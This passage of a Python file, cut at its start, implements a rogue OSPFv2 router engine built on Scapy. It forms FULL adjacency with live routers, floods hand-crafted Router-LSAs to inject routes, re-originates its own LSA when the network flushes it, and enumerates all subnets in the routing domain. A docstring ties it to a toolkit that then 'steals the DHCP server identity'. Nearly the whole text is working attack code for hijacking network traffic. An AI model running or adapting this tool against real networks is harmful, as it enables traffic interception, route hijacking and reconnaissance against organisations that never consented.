    )
    with context["lock"]:
        context["auto_route_added"] = True


def reset_adjacency_state(context, reason):
    with context["lock"]:
        context["neighbors"].clear()
        context["designated_router"] = "0.0.0.0"
        context["backup_designated_router"] = "0.0.0.0"
        context["adjacency_ready_event"].clear()
        context["menu_suppressed"] = False
        rebuild_ospf_nbr_routes_db(context)
    log_message(f"[RESET] {reason}")


def refresh_runtime_source_ip(context):
    current_ip, current_mask = read_interface_state(context["interface_name"])
    with context["lock"]:
        previous_ip = context["source_ip"]
        previous_mask = context["network_mask"]
        ip_was_available = context["source_ip_available"]

    if not current_ip or not current_mask:
        if ip_was_available:
            with context["lock"]:
                context["source_ip_available"] = False
            close_ospf_raw_socket(context)
            reset_adjacency_state(
                context,
                f"Interface {context['interface_name']} lost its usable IPv4 address or netmask. Pausing hellos until a valid address returns.",
            )
        return False

    if not ip_was_available:
        with context["lock"]:
            context["source_ip"] = current_ip
            context["network_mask"] = current_mask
            context["source_ip_available"] = True
        close_ospf_raw_socket(context)
        ensure_ospf_raw_socket(context)
        refresh_local_router_lsa(context, bump_sequence=True)
        reset_adjacency_state(
            context,
            f"Interface {context['interface_name']} recovered with IPv4 address {current_ip}. Restarting adjacency discovery.",
        )
        return True

    if current_ip == previous_ip and current_mask == previous_mask:
        return True

    with context["lock"]:
        context["source_ip"] = current_ip
        context["network_mask"] = current_mask
    close_ospf_raw_socket(context)
    ensure_ospf_raw_socket(context)
    refresh_local_router_lsa(context, bump_sequence=True)
    if current_ip != previous_ip:
        reason = (
            f"Interface {context['interface_name']} changed IPv4 address {previous_ip} -> {current_ip}. "
            "Refreshing self-originated Router-LSA."
        )
    else:
        reason = (
            f"Interface {context['interface_name']} changed IPv4 netmask {previous_mask} -> {current_mask}. "
            "Refreshing self-originated Router-LSA."
        )
    reset_adjacency_state(context, reason)
    return True


def show_neighbors(context):
    with context["lock"]:
        lines = [
            format_neighbor_status(neighbor)
            for neighbor in sorted(context["neighbors"].values(), key=lambda neighbor: neighbor["router_id"])
        ]
    if not lines:
        log_message("[STATUS] No OSPF neighbors discovered yet.")
        return
    for line in lines:
        log_message(line)


def update_full_adjacency_gate(context):
    ready_message = None
    with context["lock"]:
        has_dr = context["designated_router"] != "0.0.0.0"
        if has_dr:
            # Broadcast network: require the elected DR (and BDR if present) to be FULL.
            expected_peer_ips = [
                peer_ip
                for peer_ip in {context["designated_router"], context["backup_designated_router"]}
                if peer_ip != "0.0.0.0"
            ]
            neighbors_by_ip = {
                neighbor["ip_address"]: neighbor
                for neighbor in context["neighbors"].values()
                if is_dr_or_bdr_neighbor(neighbor)
            }
            everyone_full = bool(expected_peer_ips) and all(
                neighbors_by_ip.get(peer_ip, {}).get("state") == FULL
                for peer_ip in expected_peer_ips
            )
        else:
            # Point-to-point or pre-election: any FULL neighbor suffices.
            everyone_full = any(
                neighbor["state"] == FULL
                for neighbor in context["neighbors"].values()
            )
        if everyone_full:
            if not context["adjacency_ready_event"].is_set():
                context["adjacency_ready_event"].set()
                ready_message = "[MENU] FULL adjacency is ready. Type 'help' to view the available menu commands."
        else:
            context["adjacency_ready_event"].clear()
            context["menu_suppressed"] = False
    if ready_message:
        show_neighbors(context)
        log_message(ready_message)


# Adjacency forms in protocol order before any manual route advertisement is allowed.
def transition_neighbor(context, neighbor, new_state):
    previous_state = neighbor["state"]
    neighbor["state"] = new_state
    if previous_state == FULL and new_state != FULL:
        rebuild_ospf_nbr_routes_db(context)
    if new_state == FULL:
        state_full(context, neighbor)


def state_down(context, neighbor):
    if neighbor["state"] == DOWN:
        transition_neighbor(context, neighbor, INIT)


def state_init(context, neighbor, hello_packet):
    if neighbor["state"] == INIT and context["router_id"] in (hello_packet.neighbors or []):
        transition_neighbor(context, neighbor, TWO_WAY)


def state_two_way(context, neighbor, packet, hello_packet):
    if neighbor["state"] != TWO_WAY:
        return
    # On broadcast networks, only form full adjacency with the DR/BDR.
    # On point-to-point networks (DR = 0.0.0.0), form adjacency with every neighbor.
    if context["designated_router"] != "0.0.0.0" and not is_dr_or_bdr_neighbor(neighbor):
        return
    transition_neighbor(context, neighbor, EXSTART)
    neighbor["database_sequence"] = INITIAL_DBD_SEQ
    neighbor["is_master"] = True
    send_packet(
        context,
        build_dbd(
            context,
            neighbor,
            is_initial_packet=True,
            has_more_packets=True,
            is_master_packet=True,
            sequence_number=neighbor["database_sequence"],
        ),
        destination=neighbor["ip_address"],
    )


def state_exstart(context, neighbor, router_id, master_bit, sequence_number):
    if neighbor["state"] != EXSTART:
        return False
    try:
        neighbor_is_master = int(ipaddress.IPv4Address(router_id)) > int(ipaddress.IPv4Address(context["router_id"]))
    except Exception:
        neighbor_is_master = False
    if neighbor_is_master:
        neighbor["is_master"] = False
        neighbor["database_sequence"] = sequence_number
        transition_neighbor(context, neighbor, EXCHANGE)
        send_lsdb_summary(context, neighbor)
    elif not master_bit and sequence_number == neighbor["database_sequence"]:
        transition_neighbor(context, neighbor, EXCHANGE)
        send_lsdb_summary(context, neighbor)
    return True


def state_exchange(context, neighbor, packet, more_bit):
    peer_seq = packet[OSPF_DBDesc].ddseq
    if neighbor["state"] != EXCHANGE:
        if peer_seq == neighbor["last_peer_seq_in"] and neighbor["last_sent_dbd"] is not None:
            send_packet(context, neighbor["last_sent_dbd"], destination=neighbor["ip_address"])
            return True
        return False
    if peer_seq == neighbor["last_peer_seq_in"]:
        if neighbor["last_sent_dbd"] is not None:
            send_packet(context, neighbor["last_sent_dbd"], destination=neighbor["ip_address"])
        return True
    neighbor["last_peer_seq_in"] = peer_seq

    neighbor["requested_lsas"] = collect_unknown_lsas(context, packet)
    if not neighbor["is_master"]:
        neighbor["database_sequence"] = peer_seq
        dbd = build_dbd(context, neighbor, is_master_packet=False, sequence_number=neighbor["database_sequence"])
        neighbor["last_sent_dbd"] = dbd
        send_packet(context, dbd, destination=neighbor["ip_address"])
    if not more_bit:
        if neighbor["requested_lsas"]:
            transition_neighbor(context, neighbor, LOADING)
            ls_request_packet = build_header(context, 3)
            for lsa_type, lsa_id, adv_router in neighbor["requested_lsas"]:
                ls_request_packet = ls_request_packet / OSPF_LSReq(type=lsa_type, id=lsa_id, adrouter=adv_router)
            send_packet(context, ls_request_packet, destination=neighbor["ip_address"])
        else:
            transition_neighbor(context, neighbor, FULL)
        return True
    if neighbor["is_master"]:
        neighbor["database_sequence"] += 1
    dbd = build_dbd(context, neighbor, is_master_packet=neighbor["is_master"], sequence_number=neighbor["database_sequence"])
    neighbor["last_sent_dbd"] = dbd
    send_packet(context, dbd, destination=neighbor["ip_address"])
    return True


def state_loading(context, neighbor, packet):
    if neighbor["state"] != LOADING:
        return None
    neighbor["mac_address"] = packet[Ether].src
    neighbor["requested_lsas"].clear()
    transition_neighbor(context, neighbor, FULL)
    refresh_local_router_lsa(context)
    self_lsa = find_lsa(context, 1, context["router_id"], context["router_id"])
    if self_lsa is None:
        self_lsa = build_router_lsa(context)
    return self_lsa


def state_full(context, neighbor):
    rebuild_ospf_nbr_routes_db(context)
    log_message(format_neighbor_status(neighbor))


def collect_unknown_lsas(context, packet):
    requested_lsas = []
    lsa_layer = packet[OSPF_DBDesc].payload
    while lsa_layer and lsa_layer.name != "NoPayload":
        if not hasattr(lsa_layer, "adrouter"):
            lsa_layer = lsa_layer.payload
            continue
        lsa_type = getattr(lsa_layer, "type", 1)
        lsa_id = getattr(lsa_layer, "id", "0.0.0.0")
        advertising_router = lsa_layer.adrouter
        local_lsa = find_lsa(context, lsa_type, lsa_id, advertising_router)
        remote_sequence = getattr(lsa_layer, "seq", 0)
        if local_lsa is None or getattr(local_lsa, "seq", 0) < remote_sequence:
            requested_lsas.append((lsa_type, lsa_id, advertising_router))
        lsa_layer = lsa_layer.payload
    return requested_lsas

def send_lsdb_summary(context, neighbor):
    refresh_local_router_lsa(context)
    if neighbor["is_master"]:
        neighbor["database_sequence"] += 1
    lsa_packets = local_lsdb_entries(context)
    dbd = build_dbd(
        context,
        neighbor,
        is_master_packet=neighbor["is_master"],
        sequence_number=neighbor["database_sequence"],
        lsa_headers=[OSPF_LSA_Hdr(bytes(lsa_packet)[:20]) for lsa_packet in lsa_packets],
    )
    neighbor["last_sent_dbd"] = dbd
    send_packet(context, dbd, destination=neighbor["ip_address"])


def handle_hello(context, packet):
    ospf_header = packet[OSPF_Hdr]
    hello_packet = packet[OSPF_Hello]
    router_id = ospf_header.src
    if router_id == context["router_id"]:
        return

    with context["lock"]:
        neighbor = context["neighbors"].setdefault(router_id, make_neighbor(router_id, packet[IP].src))
        neighbor["ip_address"] = packet[IP].src
        neighbor["mac_address"] = packet[Ether].src
        neighbor["last_seen"] = time.time()
        neighbor["priority"] = hello_packet.prio
        neighbor["designated_router"] = hello_packet.router
        neighbor["backup_designated_router"] = hello_packet.backup
        if hello_packet.router != "0.0.0.0":
            context["designated_router"] = hello_packet.router
        if hello_packet.backup != "0.0.0.0":
            context["backup_designated_router"] = hello_packet.backup
        state_down(context, neighbor)
        state_init(context, neighbor, hello_packet)
        state_two_way(context, neighbor, packet, hello_packet)

    send_packet(context, build_hello(context))


def handle_dbd(context, packet):
    ospf_header = packet[OSPF_Hdr]
    database_description = packet[OSPF_DBDesc]
    router_id = ospf_header.src

    with context["lock"]:
        neighbor = context["neighbors"].get(router_id)
        if not neighbor or neighbor["state"] not in DBD_READY_STATES:
            return
        neighbor["mac_address"] = packet[Ether].src

        flags = database_description.dbdescr
        more_bit = flags & 0x02
        master_bit = flags & 0x01
        sequence_number = database_description.ddseq

        if state_exstart(context, neighbor, router_id, master_bit, sequence_number):
            return
        state_exchange(context, neighbor, packet, more_bit)


def handle_lsupd(context, packet):
    router_id = packet[OSPF_Hdr].src
    lsa_list = getattr(packet[OSPF_LSUpd], "lsalist", []) if packet.haslayer(OSPF_LSUpd) else []
    if lsa_list:
        fight_back_lsa = None
        with context["lock"]:
            for lsa_packet in lsa_list:
                if (
                    getattr(lsa_packet, "type", None) == 1
                    and getattr(lsa_packet, "id", None) == context["router_id"]
                    and getattr(lsa_packet, "adrouter", None) == context["router_id"]
                    and should_fight_back_self_lsa(context, lsa_packet)
                ):
                    if fight_back_lsa is None or getattr(lsa_packet, "seq", BASE_LSA_SEQUENCE - 1) > getattr(fight_back_lsa, "seq", BASE_LSA_SEQUENCE - 1):
                        fight_back_lsa = lsa_packet.copy()
                upsert_lsa(context, lsa_packet)
            refresh_local_router_lsa(context)
        send_packet(
            context,
            build_header(context, 5) / OSPF_LSAck(lsaheaders=[OSPF_LSA_Hdr(bytes(lsa_packet)[:20]) for lsa_packet in lsa_list]),
        )
        if fight_back_lsa is not None:
            reorigin_self_router_lsa(
                context,
                sequence_number=max(getattr(fight_back_lsa, "seq", BASE_LSA_SEQUENCE - 1) + 1, BASE_LSA_SEQUENCE),
            )

    self_lsa = None
    with context["lock"]:
        neighbor = context["neighbors"].get(router_id)
        if not neighbor:
            return
        self_lsa = state_loading(context, neighbor, packet)
    if self_lsa is not None:
        send_packet(context, build_ls_update(context, [self_lsa]), destination=ALL_DR_MULTICAST)


def handle_lsreq(context, packet):
    with context["lock"]:
        refresh_local_router_lsa(context)
        neighbor = context["neighbors"].get(packet[OSPF_Hdr].src)
        if neighbor:
            neighbor["mac_address"] = packet[Ether].src
        requested_lsa_packets = []
        request_layer = packet[OSPF_LSReq]
        while request_layer and request_layer.name != "NoPayload":
            if hasattr(request_layer, "adrouter"):
                local_lsa = find_lsa(context, request_layer.type, request_layer.id, request_layer.adrouter)
                if local_lsa is not None:
                    requested_lsa_packets.append(local_lsa.copy())
            request_layer = request_layer.payload
    send_packet(context, build_ls_update(context, requested_lsa_packets), destination=packet[IP].src)


def dispatch_packet(context, packet):
    if not packet.haslayer(OSPF_Hdr):
        return
    if packet[OSPF_Hdr].area != context["area_id"]:
        return
    if packet.haslayer(IP) and packet[IP].src == context["source_ip"] and packet[OSPF_Hdr].src == context["router_id"]:
        return
    ospf_packet_type = packet[OSPF_Hdr].type
    if ospf_packet_type == 1:
        handle_hello(context, packet)
    elif ospf_packet_type == 2:
        handle_dbd(context, packet)
    elif ospf_packet_type == 3:
        handle_lsreq(context, packet)
    elif ospf_packet_type == 4:
        handle_lsupd(context, packet)


def runtime_console(context):
    log_message("[MENU] Waiting for FULL adjacency before enabling manual actions.")
    while not context["stop_event"].is_set():
        if not context["adjacency_ready_event"].wait(timeout=1):
            continue
        with context["lock"]:
            suppress_menu = context["menu_suppressed"]
        try:
            command = input(MENU_HIDDEN_PROMPT if suppress_menu else MENU_PROMPT).strip().lower()
        except EOFError:
            continue
        except KeyboardInterrupt:
            context["stop_event"].set()
            return
        if suppress_menu:
            if command == "" or command == "q":
                continue
            if command == "m":
                with context["lock"]:
                    context["menu_suppressed"] = False
                log_message("[MENU] The menu prompt is enabled again. Type 'help' to view the available commands.")
                continue
            log_message(MENU_HIDDEN_TEXT)
            continue
        if command == "":
            continue
        if command == "help":
            log_message(MENU_HELP_TEXT)
            continue
        if command == "m":
            log_message("[MENU] The menu prompt is already enabled. Type 'help' to view the available commands.")
            continue
        if command == "1":
            if not context["adjacency_ready_event"].is_set():
                log_message("[MENU] Wait until all discovered neighbors reach FULL before flooding a manual Router-LSA.")
                continue
            prompt_and_add_router_stub_route(context, input, log_message, normalize_network=normalize_network, ospf_link_cls=OSPF_Link, next_lsa_sequence=next_lsa_sequence, build_router_lsa=build_router_lsa, upsert_lsa=upsert_lsa,flood_lsa_packets=flood_lsa_packets)
            continue
        if command == "2":
            show_neighbors(context)
            continue
        if command == "3":
            lsa_packets = local_lsdb_entries(context)
            if not lsa_packets:
                log_message("[LSDB] Local LSDB is empty.")
                continue
            for lsa_packet in lsa_packets:
                log_message(
                    f"[LSDB] type={lsa_packet.type} id={lsa_packet.id} adv={lsa_packet.adrouter} "
                    f"seq=0x{getattr(lsa_packet, 'seq', 0):08x}"
                )
            continue
        if command == "4":
            route_map = {
                advertising_router: [route.copy() for route in routes]
                for advertising_router, routes in OSPF_NBR_ROUTES_DB.items()
            }
            if not route_map:
                log_message("[ROUTES] OSPF_NBR_ROUTES_DB is empty.")
                continue
            for advertising_router in sorted(route_map):
                for route in route_map[advertising_router]:
                    log_message(
                        f"[ROUTES] adv={advertising_router} net={route['network']} "
                        f"mask={route['netmask']} metric={route['metric']} seq={route['sequence']}"
                    )
            continue
        if command == "5":
            subnets = enumerate_ospf_subnets(context)
            if not subnets:
                log_message("[SUBNETS] No subnets found in LSDB yet (wait for FULL adjacency).")
            else:
                log_message(f"[SUBNETS] {len(subnets)} subnet(s) advertised in this OSPF domain:")
                for s in subnets:
                    log_message(f"[SUBNETS]   {s['network']}/{s['netmask']}  adv={s['adv_router']}")
            continue
        if command == "q":
            with context["lock"]:
                context["menu_suppressed"] = True
            log_message(MENU_HIDDEN_TEXT)
            continue
        log_message(f"[MENU] Unknown command '{command}'. Type 'help' to view the available commands.")


def run_engine(context):
    ensure_ospf_raw_socket(context)
    threading.Thread(
        target=sniff,
        kwargs=dict(iface=context["interface_name"], filter=OSPF_SNIFF_FILTER, prn=lambda packet: dispatch_packet(context, packet), store=0),
        daemon=True,
    ).start()
    threading.Thread(target=runtime_console, args=(context,), daemon=True).start()
    log_message(f"[*] Sniffer on {context['interface_name']}")
    log_message("[*] Hellos sending -- Ctrl+C to stop.\n")

    try:
        while True:
            if not refresh_runtime_source_ip(context):
                update_full_adjacency_gate(context)
                time.sleep(context["hello_interval"])
                continue
            send_packet(context, build_hello(context))

            with context["lock"]:
                expired = [
                    (router_id, neighbor)
                    for router_id, neighbor in context["neighbors"].items()
                    if time.time() - neighbor["last_seen"] > context["dead_interval"]
                ]
                lost_full_neighbor = context["adjacency_ready_event"].is_set() and any(
                    neighbor["state"] == FULL and is_dr_or_bdr_neighbor(neighbor)
                    for _, neighbor in expired
                )
                for router_id, _neighbor in expired:
                    del context["neighbors"][router_id]
                if expired:
                    rebuild_ospf_nbr_routes_db(context)
            if lost_full_neighbor:
                log_message("[MENU] FULL adjacency is no longer stable. Manual Router-LSA flooding is paused.")
            for router_id, _neighbor in expired:
                log_message(f"[DEAD] {router_id} expired.")

            update_full_adjacency_gate(context)
            maybe_add_auto_route(context)
            time.sleep(context["hello_interval"])
    except KeyboardInterrupt:
        context["stop_event"].set()
        withdraw_injected_routes(context)
        close_ospf_raw_socket(context)
        log_message("\n[*] Exiting.")


# ── Integration helpers (called by main.py) ──────────────────────────────────

OSPF_FULL_WAIT_TIMEOUT = 300


def wait_for_adjacency_exchange(interface, source_ip, timeout=OSPF_FULL_WAIT_TIMEOUT):
    """Block until an OSPF LS Request/Update (type 4/5) is seen from a neighbor.

    Confirms the engine launched in the other terminal has reached the database
    exchange phase before main.py proceeds to steal the DHCP server identity.
    """
    seen = []

    def handle_packet(packet):
        if packet.haslayer(OSPF_Hdr) and packet.haslayer(IP) and packet[IP].src != source_ip:
            packet_type = int(packet[OSPF_Hdr].type)
            if packet_type in {4, 5}:
                seen.append(packet_type)
                return True
        return False

    log_message(f"[*] Waiting up to {timeout}s for OSPF adjacency exchange on {interface}")
    sniff(iface=interface, filter=OSPF_SNIFF_FILTER, store=False, timeout=timeout, stop_filter=handle_packet)
    if seen:
        log_message(f"[OK] Detected OSPF adjacency exchange (type {seen[-1]}) on {interface}")
        return
    log_message(f"[!] Timed out waiting for OSPF adjacency exchange on {interface}")
    raise TimeoutError(f"Timed out waiting for OSPF adjacency exchange on {interface}")


def launch_in_terminal(interface, vlan_id=None, auto_route_ip=None,
                       area_id=None, hello_interval=None, dead_interval=None):
    """Run this OSPF engine in a new Linux terminal so its interactive menu works.

    On non-Linux hosts, falls back to a blocking foreground run.
    area_id, hello_interval, and dead_interval (learned from sniff_ospf_hellos)
    are forwarded to the child process so it matches the SVI's parameters exactly.
    """
    ospf_script = Path(__file__).resolve()
    ospf_command = [sys.executable, str(ospf_script), "--iface", interface]
    child_env = os.environ.copy()
    if vlan_id is not None:
        ospf_command.extend(["--vlan", str(vlan_id)])
    if hello_interval is not None:
        ospf_command.extend(["--interval", str(int(hello_interval))])
    if auto_route_ip is not None:
        child_env[AUTO_ROUTE_IP_ENV] = str(ipaddress.IPv4Address(auto_route_ip))
    else:
        child_env.pop(AUTO_ROUTE_IP_ENV, None)
    if area_id is not None:
        child_env[OSPF_AREA_ID_ENV] = str(area_id)
    else:
        child_env.pop(OSPF_AREA_ID_ENV, None)
    if dead_interval is not None:
        child_env[OSPF_DEAD_INTERVAL_ENV] = str(int(dead_interval))
    else:
        child_env.pop(OSPF_DEAD_INTERVAL_ENV, None)

    if platform.system().lower() != "linux":
        log_message(f"[*] Launching OSPF full adjacency engine on {interface}")
        subprocess.run(ospf_command, check=True, env=child_env)
        return

    shell_command = " ".join(shlex.quote(str(part)) for part in ospf_command)
    terminal_shell_command = (
        f"{shell_command}; "
        "exit_code=$?; "
        "echo; "
        "echo \"OSPF adjacency engine exited with status ${exit_code}.\"; "
        "read -r -p \"Press Enter to close this terminal...\"; "
        "exit ${exit_code}"
    )
    terminal_options = [
        ("x-terminal-emulator", ["-e", "bash", "-lc", terminal_shell_command]),
        ("qterminal", ["-e", "bash", "-lc", terminal_shell_command]),
        ("xfce4-terminal", ["--hold", "--command", f"bash -lc {shlex.quote(terminal_shell_command)}"]),
        ("gnome-terminal", ["--", "bash", "-lc", terminal_shell_command]),
        ("konsole", ["--noclose", "-e", "bash", "-lc", terminal_shell_command]),
        ("xterm", ["-hold", "-e", "bash", "-lc", terminal_shell_command]),
    ]

    for terminal_name, terminal_args in terminal_options:
        terminal_path = shutil.which(terminal_name)
        if terminal_path:
            log_message(f"[*] Opening OSPF adjacency engine in a new terminal on {interface}")
            subprocess.Popen([terminal_path, *terminal_args], env=child_env)
            log_message(f"[OK] OSPF adjacency terminal launched with {terminal_name}")
            return

    raise RuntimeError(
        "No supported Linux terminal emulator found. Install x-terminal-emulator, "
        "qterminal, xfce4-terminal, gnome-terminal, konsole, or xterm."
    )


def main():
    parser = argparse.ArgumentParser(prog="ospf_adjacency.py")
    parser.add_argument("--iface", default=default_iface())
    parser.add_argument("--vlan", type=int, help="Create/use iface.VLAN and run OSPF on that VLAN subinterface")
    parser.add_argument("--interval", default=HELLO_INTERVAL, type=int)
    args = parser.parse_args()

    ospf_interface = ensure_vlan_subinterface(args.iface, args.vlan)

    source_ip, network_mask = read_interface_state(ospf_interface)
    if not source_ip or not network_mask:
        sys.exit(f"[!] No usable IPv4 address or netmask for '{ospf_interface}'.")

    auto_route_ip = os.environ.get(AUTO_ROUTE_IP_ENV)
    if auto_route_ip:
        try:
            auto_route_ip = str(ipaddress.IPv4Address(auto_route_ip))
        except ipaddress.AddressValueError:
            log_message(f"[WARN] Ignoring invalid {AUTO_ROUTE_IP_ENV} value: {auto_route_ip}")
            auto_route_ip = None

    area_id = os.environ.get(OSPF_AREA_ID_ENV, BACKBONE_AREA)
    try:
        ipaddress.IPv4Address(area_id)
    except ipaddress.AddressValueError:
        log_message(f"[WARN] Ignoring invalid {OSPF_AREA_ID_ENV} value: {area_id!r}")
        area_id = BACKBONE_AREA

    dead_interval = DEAD_INTERVAL
    raw_dead = os.environ.get(OSPF_DEAD_INTERVAL_ENV)
    if raw_dead:
        try:
            dead_interval = int(raw_dead)
        except ValueError:
            log_message(f"[WARN] Ignoring invalid {OSPF_DEAD_INTERVAL_ENV} value: {raw_dead!r}")

    log_message("=" * 52)
    log_message("  OSPFv2 Full Adjacency Engine")
    log_message(f"  iface={ospf_interface}  src={source_ip}  rid={DEFAULT_ROUTER_ID}")
    log_message(f"  area={area_id}  hello={args.interval}s  dead={dead_interval}s")
    log_message("=" * 52)

    context = make_context(
        ospf_interface, source_ip, network_mask, args.interval,
        auto_route_ip=auto_route_ip,
        area_id=area_id,
        dead_interval=dead_interval,
    )
    refresh_local_router_lsa(context)
    run_engine(context)


if __name__ == "__main__":
    main()
